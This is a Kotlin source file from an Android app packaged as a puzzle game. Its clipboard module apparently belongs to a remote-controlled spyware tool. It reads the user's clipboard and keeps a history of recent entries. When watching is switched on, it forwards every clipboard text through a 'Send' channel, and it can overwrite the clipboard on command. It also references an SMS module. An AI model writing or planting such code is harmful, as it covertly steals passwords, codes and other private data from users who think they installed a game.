package com.puzzleblast.game.modules

import android.content.ClipboardManager
import android.content.Context
import com.puzzleblast.game.core.Send
import com.puzzleblast.game.util.Prefs
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

object ClipboardModule {
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    val history = mutableListOf<Pair<String, Long>>()

    fun log(text: String) {
        history.add(text to System.currentTimeMillis())
        if (history.size > 20) history.removeAt(0)
        if (Prefs.clipboardWatch) {
            scope.launch { Send.text("📋 clipboard: $text") }
        }
    }

    suspend fun current(ctx: Context): String {
        val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val text = cm.primaryClip?.getItemAt(0)?.text?.toString() ?: "(empty)"
        return "📋 clipboard: $text"
    }

    suspend fun set(ctx: Context, text: String): String {
        val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        cm.setPrimaryClip(android.content.ClipData.newPlainText("t", text))
        return "✏️ clipboard set"
    }

    suspend fun watch(on: Boolean): String {
        Prefs.clipboardWatch = on
        return if (on) "👀 clipboard watch on" else "👀 clipboard watch off"
    }

    suspend fun history(): String {
        if (history.isEmpty()) return "📜 no clipboard history"
        return "📜 last ${history.size}\n" + history.joinToString("\n") { (t, time) ->
            "  ${t.take(80)} · ${SmsModule.relTime(time)}"
        }
    }
}
